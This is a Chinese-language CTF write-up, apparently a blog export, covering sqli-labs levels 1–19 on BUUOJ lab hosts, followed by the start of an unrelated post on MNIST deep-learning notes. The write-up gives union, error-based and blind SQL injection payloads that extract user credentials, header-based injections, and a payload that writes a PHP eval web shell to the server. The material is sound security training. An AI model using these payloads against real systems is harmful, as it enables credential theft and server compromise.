href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,2,3–+</em></strong></p><hr><ul><li><p>查看数据库名称</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" srcset="data:image/png;base64,666" alt="Ga9sko.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,database(),3–+</em></strong></p><hr><ul><li><p>查看库中的表</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" srcset="data:image/png;base64,666" alt="Ga9q0T.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</em></strong></p><hr><ul><li><p>查看用户表中字段</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" srcset="data:image/png;base64,666" alt="Ga9e4r.png"></p></li></ul><p><strong><em>payload：<a href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+</em></strong></p><hr><ul><li><p>查看用户名和密码</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" srcset="data:image/png;base64,666" alt="Ga9JxK.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username,password),3 from security.users–+</em></strong></p><hr><ul><li><p>换个方式显示</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" srcset="data:image/png;base64,666" alt="Ga9xj1.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from security.users–+</em></strong></p><hr><h2 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h2><ul><li><p>判断是数字型注入还是字符型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" srcset="data:image/png;base64,666"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1</a></em></strong></p><hr><ul><li><p>判断注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" srcset="data:image/png;base64,666" alt="Ga9H0u.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>往下操作与第一题类似，payload就差了一个单引号</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" srcset="data:image/png;base64,666" alt="Ga9bjv.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" srcset="data:image/png;base64,666" alt="Ga9NuR.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1</a></em></strong></p><hr><ul><li><p>该题为字符型注入，但直接使用联合注入报错</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" srcset="data:image/png;base64,666" alt="Ga90Nn.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" srcset="data:image/png;base64,666" alt="Ga9vRP.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>往下与第一题相同，union后的payload一致</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" srcset="data:image/png;base64,666" alt="Ga9wA6.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" srcset="data:image/png;base64,666" alt="Ga98Ih.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1</a></em></strong></p><hr><ul><li><p>使用单引号进行闭合，报错</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" srcset="data:image/png;base64,666" alt="Ga9I10.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>组合单引号、双引号以及括号得到注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" srcset="data:image/png;base64,666" alt="Ga97r5.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;</a>) union select 1,2,3–+</em></strong></p><hr><ul><li><p>往下步骤与上述题目相同</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" srcset="data:image/png;base64,666" alt="Ga96lm.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p>回显报错数据，尝试盲注</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetUSz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetUSz.png" srcset="data:image/png;base64,666" alt="GetUSz.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+</a></p><hr><ul><li><p>对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果</p><p><img src="https://www.helloimg.com/images/2021/12/05/Get68n.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/Get68n.png" srcset="data:image/png;base64,666" alt="Get68n.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li><p>改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetKoR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetKoR.png" srcset="data:image/png;base64,666" alt="GetKoR.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+</a></p><hr><ul><li>列名以此类推</li></ul><p>可以用python写个脚本来跑，或者使用burpsuite</p><p>另外，还可以使用updataxml()函数来获取相关信息</p><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" srcset="data:image/png;base64,666" alt="Gi3aM0.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+</a></p><hr><h2 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h2><p>与上一道题类似，将单引号换为双引号</p><hr><h2 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h2><ul><li>利用永真永假的条件配合and和or判断参数id的闭合方式</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi318m.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi318m.png" srcset="data:image/png;base64,666" alt="Gi318m.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+</a></p><hr><ul><li>利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" srcset="data:image/png;base64,666" alt="Gi3PX5.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;</a>)) union select 1,’2’,”<?php @eval($_POST['hahaha'];)?>“ into outfile “./“ –+</p><p>由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断</p><hr><h2 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h2><ul><li>判断参数闭合方式</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" srcset="data:image/png;base64,666" alt="GiXeU9.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+</a></p><hr><ul><li>由于注入错误时不回显，因此可以使用上述的盲注</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXEng.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXEng.png" srcset="data:image/png;base64,666" alt="GiXEng.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li>往后步骤与上述盲注步骤一致</li></ul><hr><h2 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h2><ul><li>在判断参数闭合方式时，发现回显不改变</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" srcset="data:image/png;base64,666" alt="GiX3qE.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+</a></p><hr><ul><li>尝试基于时间的盲注</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" srcset="data:image/png;base64,666" alt="GiXxPX.png"></p><p>可以看到网页根据设定的时间正在加载，说明注入成功</p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+</a></p><hr><ul><li>接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"></p><p>payload取上述盲注payload的查询部分</p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+</a></p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><ul><li>将闭合参数的单引号替换为双引号，其余一致</li></ul><hr><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意</p><ul><li>不可以直接将url编码之后的数据（如%20）直接提交</li><li>最后的注释不可以用“–+”，而应该用“#”</li></ul><p><img src="https://www.helloimg.com/images/2021/12/19/GvklDS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvklDS.png" srcset="data:image/png;base64,666" alt="GvklDS.png"></p><p>上面这样注释是行不通的，用“#”代替“–+”之后如下图</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkHao.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkHao.png" srcset="data:image/png;base64,666" alt="GvkHao.png"></p><p>然后再用之前写过的题当中出现的联合注入</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" srcset="data:image/png;base64,666" alt="Gvkigb.png"></p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" srcset="data:image/png;base64,666" alt="GvkbHD.png"></p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>原理同上一题一致，唯一差别是闭合方式不同</p><p><a href="https://www.helloimg.com/image/GvraLC"><img src="https://www.helloimg.com/images/2021/12/19/GvraLC.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvraLC.png" srcset="data:image/png;base64,666" alt="GvraLC.png"></a></p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" srcset="data:image/png;base64,666" alt="Gvr1NQ.png"></p><hr><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分</p><p>下图是联合注入后无回显的结果</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" srcset="data:image/png;base64,666" alt="Gvhw7o.png"></p><hr><p>这里使用了报错注入返回了mysql的绝对路径</p><p><strong>payload</strong>：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" srcset="data:image/png;base64,666" alt="GvhNBD.png"></p><hr><p>这里查询到了当前的数据库</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" srcset="data:image/png;base64,666" alt="Gvhvnb.png"></p><hr><p>需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整</p><p><strong>payload</strong>：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" srcset="data:image/png;base64,666" alt="GvhdFK.png"></p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>这道题与上一道题类似，唯一不同的仍是闭合方式不同</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>这道题考察的是post方式的基于时间的盲注</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" srcset="data:image/png;base64,666" alt="GQtNsK.png"></p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" srcset="data:image/png;base64,666" alt="GQtvzT.png"></p><p>一开始依然先判断闭合方式</p><hr><p>然后用if语句构造基于时间的盲注</p><p>这里无需关注是否登录成功，只需关注响应时间</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" srcset="data:image/png;base64,666" alt="GQtQvb.png"></p><hr><p>然后根据上述题目中有关基于时间的盲注有关的题目的payload进行注入</p><p><strong>payload</strong>：1’ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=’c’),sleep(2),1) #</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" srcset="data:image/png;base64,666" alt="GQt0B1.png"></p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>这道题与上一道题目差不多，唯一区别仍是闭合方式不同</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这道题涉及到了sql语句中update部分，模拟的是在登录成功后修改密码时的注入</p><p>这里由于无法回显闭合方式是否正确，故使用基于时间的盲注中的小技巧进行判断</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" srcset="data:image/png;base64,666" alt="GQAE1g.png"></p><hr><p>往下的过程涉及到<strong>子查询</strong>的概念，即以查询的结果作为下一次查询的范围</p><p>查数据库</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" srcset="data:image/png;base64,666" alt="GQAm6P.png"></p><hr><p>往后只需将select database()替换为先前题目中相应的payload即可</p><p><a href="https://www.helloimg.com/image/GQALuz"><img src="https://www.helloimg.com/images/2021/12/25/GQALuz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQALuz.png" srcset="data:image/png;base64,666" alt="GQALuz.png"></a></p><hr><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一开始给出了本机的ip地址，意义不明（估计是提示可以注入某些类型的信息以执行）</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPBct.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPBct.png" srcset="data:image/png;base64,666" alt="GzPBct.png"></p><p>再经过对username和password的多次注入后发现没有什么效果，尝试登录</p><hr><p><img src="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" srcset="data:image/png;base64,666" alt="GzPR3v.png"></p><p>可以看出登录后回显了user agent，则可以通过抓包修改user agent的方式注入</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPZME.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPZME.png" srcset="data:image/png;base64,666" alt="GzPZME.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPCru.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPCru.png" srcset="data:image/png;base64,666" alt="GzPCru.png"></p><p><strong>payload</strong>：’and updatexml(1,concat(0x7e,database(),0x7e),1) or ‘</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>这道题与上一道差不多，只不过修改的是Referer字段</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" srcset="data:image/png;base64,666" alt="GzPJXR.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" srcset="data:image/png;base64,666" alt="GzPxVn.png"></p><p><strong>payload</strong>：与上一道题一致</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf、web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 2</title>
      <link href="2021/11/29/deep_learning_from_scratch_2/"/>
      <url>2021/11/29/deep_learning_from_scratch_2/</url>
      
        <content type="html"><![CDATA[<h2 id="在”手写数字识别”中"><a href="#在”手写数字识别”中" class="headerlink" title="在”手写数字识别”中"></a>在”手写数字识别”中</h2><a id="more"></a><ul><li><p>了解到了mnist数据集</p></li><li><p>对运算过程中运算的具体对象有点问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">sys.path.append(os.pardir)</span><br><span class="line"><span class="keyword">from</span> dataset.mnist <span class="keyword">import</span> load_mnist</span><br><span class="line"></span><br><span class="line">(x_train, t_train), (x_test, t_test) = load_mnist(flatten=<span class="literal">True</span>, normalize=<span class="literal">False</span>) <span class="comment">#一开始不知道这是什么意思</span></span><br><span class="line"></span><br><span class="line">print(x_train.shape)</span><br><span class="line">print(t_train.shape)</span><br><span class="line">print(x_test.shape)</span><br><span class="line">print(t_test.shape)</span><br></pre></td></tr></table></figure></li></ul><p>对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了</p><p>x_train 是训练用的图像数据</p><p>t_train 是训练图像的解，即每个图像对应的数字</p><p>x_test 是用于测试的图像数据</p><p>t_test 是测试图像的解，即每个图像对应的数字</p><ul><li><p>认识了正规化、预处理和 one-hot 表示法</p><p>正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算</p><p>预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等</p><p>one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y)</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y = predict(network, x[i])</span><br><span class="line">    p= np.argmax(y) <span class="comment"># 获取概率最高的元素的索引</span></span><br><span class="line">    <span class="keyword">if</span> p == t[i]:</span><br><span class="line">        accuracy_cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><p>另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系</p><p>输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小</p><p>输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十</p></li></ul><h2 id="在“从数据中学习”中"><a href="#在“从数据中学习”中" class="headerlink" 